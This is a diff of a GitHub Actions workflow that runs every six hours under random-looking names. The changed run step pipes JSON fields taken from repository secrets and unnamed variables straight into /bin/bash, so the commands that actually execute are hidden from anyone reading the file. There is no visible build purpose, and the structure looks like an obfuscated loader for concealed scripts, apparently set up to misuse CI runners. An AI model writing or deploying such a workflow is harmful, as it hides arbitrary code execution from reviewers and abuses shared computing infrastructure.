@@ -3,8 +3,9 @@ name: lianglingxiao5432
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
-jobs:  # 16235
+    - cron: '16 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +13,14 @@ jobs:  # 16235
       - uses: actions/checkout@v4
       - name: lianglingxiao5432
         env:
-          lt792: ${{ secrets.lt792 }}
+          k1: ${{ secrets.k1 }}
         run: |
-          echo $lt792 | jq -r .jpf417 | /bin/bash
-          echo $qzek4661 | jq -r .dzw060 | /bin/bash
-          echo $bjsa7568 | jq -r .rv1419 | /bin/bash
+          echo $k1 | jq -r .bcyog4310 | /bin/bash
+          echo $v14917 | jq -r .k44851 | /bin/bash
+          echo $ghx03 | jq -r .coqxc4 | /bin/bash
+          echo $p1 | jq -r .edvuj51768 | /bin/bash
+          echo $z65053 | jq -r .annc1496 | /bin/bash
+          echo $f4 | jq -r .wn2114 | /bin/bash
+          echo $ugi23490 | jq -r .utrg6 | /bin/bash
+          echo $yrs597 | jq -r .kuyj755 | /bin/bash
 
